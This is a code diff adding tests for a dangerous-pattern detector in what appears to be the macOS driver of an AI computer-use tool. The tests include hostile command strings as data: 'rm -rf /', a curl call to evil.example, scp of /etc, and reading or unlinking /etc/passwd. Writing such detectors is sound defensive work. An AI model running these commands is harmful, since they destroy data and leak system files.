@@ -5,7 +5,7 @@
  */
 import { test } from 'node:test'
 import assert from 'node:assert/strict'
-import { needsClipboardInput } from '../macos-driver.js'
+import { needsClipboardInput, hasDangerousPatterns } from '../macos-driver.js'
 import { createComputerUseTool } from '../tool.js'
 
 test('needsClipboardInput: ASCII 走 keystroke', () => {
@@ -35,4 +35,41 @@ test('timeoutMs: 感知类动作 90s，其余 60s（含变更后反馈树采集�
   assert.equal(at('launch_app'), 60_000)
   // 无参调用（管道防御路径）回落到默认 60s。
   assert.equal(tool.timeoutMs!(), 60_000)
+})
+
+test('hasDangerousPatterns: 拦截破坏/外传原语', () => {
+  assert.ok(hasDangerousPatterns('doShellScript("rm -rf /")'))
+  assert.ok(hasDangerousPatterns('rm -rf /'))
+  assert.ok(hasDangerousPatterns('curl -s http://evil.example'))
+  assert.ok(hasDangerousPatterns('Application("Terminal").doShellScript("rm")'))
+  assert.ok(hasDangerousPatterns('$.NSWorkspace.sharedWorkspace'))
+  assert.ok(hasDangerousPatterns('app.open("file:///etc/passwd")'))
+  assert.ok(hasDangerousPatterns('scp -r /etc /tmp/x'))
+  assert.ok(hasDangerousPatterns('unlink("/etc/passwd")'))
+})
+
+test('hasDangerousPatterns: 放行驱动真实模板与普通参数', () => {
+  // 从 macos-driver 实际模板取样的正常脚本——不得误伤
+  const realTemplates = [
+    `const se = Application('System Events');
+     const proc = se.processes.byName('Finder');
+     proc.frontmost = true;
+     se.keystroke('hello');
+     'ok';`,
+    `const app = Application('Finder');
+     app.activate();
+     'ok';`,
+    `const se = Application('System Events');
+     const proc = se.processes.byName('Safari');
+     proc.menuBars[0].menuBarItems;
+     'ok';`,
+    `const se = Application('System Events');
+     const proc = se.processes.byName('Notes');
+     proc.attributes.byName('AXEnhancedUserInterface').value = true;
+     'ok';`,
+  ]
+  for (const t of realTemplates) {
+    assert.equal(hasDangerousPatterns(t), null, `template must pass: ${t.slice(0, 60)}`)
+  }
+  assert.equal(hasDangerousPatterns(''), null)
 })
